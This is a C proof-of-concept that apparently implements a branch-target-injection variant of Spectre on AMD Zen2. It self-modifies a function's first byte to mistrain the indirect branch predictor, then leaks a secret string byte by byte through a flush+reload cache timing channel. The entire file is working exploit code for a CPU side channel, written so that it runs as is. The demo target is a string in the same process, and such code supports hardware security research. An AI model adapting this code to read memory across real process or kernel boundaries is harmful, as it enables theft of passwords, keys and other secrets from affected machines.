/* This dummy PoC is tested on an AMD Threadripper Zen2
 * and builds on the Spectre v1 PoC written in the
 * Appendix C of the Spectre paper in
 * https://spectreattack.com/spectre.pdf
 */

/* Required for CPU affinity functions */
#define _GNU_SOURCE
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <x86intrin.h>

#include <unistd.h>
#include <sys/mman.h>


enum training_mode {
	TRAIN,
	ATTACK,
};

#define RET 0xC3

/* The rdtscp in itself takes about 60 cycles on Zen2 */
#define CACHE_HIT_THRESHOLD 80
/* Covert channel */
#define ELEMENT_PADDING (512)
/* The number of characters in the ASCII space */
#define NUM_ELEMENTS 256
uint8_t covert_channel[NUM_ELEMENTS * ELEMENT_PADDING];

char *secret = "L Lag gaye";

void indirect_call(void **pointer_to_target, void *secret, void *covert_channel)
{
	__asm__ (
		"mov %1, %%rdi \n\t"
		"mov %2, %%rsi \n\t"
		"clflush (%0) \n\t"
		"mov (%0), %%rax \n\t"
		"call *(%%rax) \n\t"
		:
		:"r"(pointer_to_target), "r"(secret), "r"(covert_channel)
		:"rax","rdi","rsi"
	);
}

void malicious_target(void *secret, void *covert_channel) {
  /* A dependant load where the index into the covert channel is dependant on
   * the secret.
   */
  __asm__("1:"
          "movzxb (%0), %%eax \n\t"
          "shl $9, %%rax \n\t"
          "add %1, %%rax \n\t"
          "movq (%%rax), %%rbx \n\t"
          "jmp 1b \n\t"
          :
          : "r"(secret), "r"(covert_channel)
          : "rax", "rbx");
}

void benign_target(void* a, void* b)
{
}

void flush_covert_channel() {
  for (int i = 0; i < NUM_ELEMENTS; i++)
    _mm_clflush(&covert_channel[i * ELEMENT_PADDING]);
  _mm_mfence();
}

char make_writable(void *page)
{
	return mprotect((void *)((long)page & (~0xfff)), 256, PROT_READ | PROT_WRITE | PROT_EXEC);
}

void read_byte_from_channel(char *secret_addr, char secret_value[2],
                            int score[2]) {
  volatile int result;
  int hits[NUM_ELEMENTS];
  int winner, runner_up;

  enum training_mode training_sequence[6] = {
	TRAIN,
	TRAIN,
	TRAIN,
	TRAIN,
	TRAIN,
	ATTACK
  };
  uint8_t first_byte_of_malicious_target = *(uint8_t *)(malicious_target);
  void (*target)(void*, void*) = NULL;
  void *pointer_to_target = (void *)(&target);

  for (int i = 0; i < NUM_ELEMENTS; i++) {
    hits[i] = 0;
    covert_channel[i * ELEMENT_PADDING] = 0;
  }

  for (int iter = 0; iter < 1000; iter++) {
    for (int i = 0; i < NUM_ELEMENTS; i++)
      _mm_clflush(&covert_channel[i * ELEMENT_PADDING]);

    for (int i = 0; i < 6; i++) {
      if (training_sequence[i] == ATTACK) {
        *(uint8_t *)(malicious_target) = first_byte_of_malicious_target;
        target = benign_target;
      } else {
        *(uint8_t *)(malicious_target) = RET;
        target = malicious_target;
      }
      indirect_call(&pointer_to_target, secret_addr, covert_channel);
    }

    for (int i = 0; i < NUM_ELEMENTS; i++) {
      uint64_t start, elapsed;
      int mix_i;
      uint8_t *addr;
      /* This trick of mixing the indices to evade stride prediction
       * as mentioned in the example in Appendix C.
       */
      mix_i = ((i * 167) + 13) & 255;
      addr = &covert_channel[mix_i * ELEMENT_PADDING];
      start = __rdtsc();
      result ^= *addr;
      _mm_mfence();
      elapsed = __rdtsc() - start;
      if (elapsed <= CACHE_HIT_THRESHOLD)
        hits[mix_i]++;
    }

    winner = -1, runner_up = -1;
    for (int i = 0; i < NUM_ELEMENTS; i++) {
      if (winner < 0 || hits[i] >= hits[winner]) {
        runner_up = winner;
        winner = i;
      } else if (runner_up < 0 || hits[i] >= hits[runner_up]) {
        runner_up = i;
      }
    }
    if ((hits[winner] >= 2 * hits[runner_up] + 5) ||
        (hits[winner] == 2 && hits[runner_up] == 0)) {
      break;
    }
  }

  hits[0] ^= result;
  secret_value[0] = (char)winner;
  score[0] = hits[winner];
  secret_value[1] = (char)runner_up;
  score[1] = hits[runner_up];
}

// Function to set CPU affinity to a single core (improves accuracy)
void set_cpu_affinity() {
  cpu_set_t set;
  CPU_ZERO(&set);
  CPU_SET(0, &set); // Bind to CPU 0
  sched_setaffinity(0, sizeof(set), &set);
}

int main() {
  set_cpu_affinity(); // Pin execution to CPU 0 for accuracy

  char result[2];
  int score[2];
  int probe_len = strlen(secret);
  char *probe_addr = secret;

  make_writable(malicious_target);
  printf("Reading %d bytes starting at %p:\n", probe_len, probe_addr);
  while (--probe_len >= 0) {
    printf("reading %p...", probe_addr);
    read_byte_from_channel(probe_addr++, result, score);
    printf("%s: (hits=%d vs %d)",
           (score[0] > 0 && score[0] >= 2 * score[1] ? "success" : "unclear"),
           score[0], score[1]);
    printf("0x%02X='%c'\n", result[0],
           (result[0] > 31 && result[0] < 127 ? result[0] : '?'));
  }
  printf("\n");
}